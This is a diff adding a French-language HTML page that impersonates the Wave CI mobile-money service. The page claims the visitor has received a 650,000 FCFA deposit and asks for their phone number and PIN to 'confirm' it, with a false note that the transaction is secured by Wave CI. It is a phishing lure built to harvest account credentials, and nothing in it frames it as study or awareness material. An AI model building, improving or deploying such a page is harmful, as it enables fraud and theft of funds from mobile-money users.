@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Wave CI - Confirmez votre dépôt</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f2f2f2;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            margin: 50px auto;
+            padding: 20px;
+            background-color: white;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+            text-align: center;
+        }
+        img.logo {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            color: #0A84FF;
+        }
+        .message {
+            margin-bottom: 20px;
+            font-size: 18px;
+            color: #333;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            background-color: #0A84FF;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #006bb3;
+        }
+        .secure-message {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #999;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <img src="C:/Users/Administrateur/Downloads/wave.webp" alt="Logo de Wave CI" class="logo">
+        <h1>Wave CI</h1>
+        <p class="message">Vous avez reçu un dépôt de <strong>650 000 FCFA</strong> du numéro +225 ******78.<br>Veuillez entrer vos informations pour confirmer et recevoir le montant.</p>
+
+        <form action="#" method="POST">
+            <input type="text" name="phone" placeholder="Numéro de téléphone" required><br>
+            <input type="password" name="pin" placeholder="Code PIN" required><br>
+            <button type="submit">Confirmer le dépôt</button>
+        </form>
+
+        <p class="secure-message">Cette transaction est sécurisée par Wave CI.</p>
+    </div>
+
+</body>
+</html>
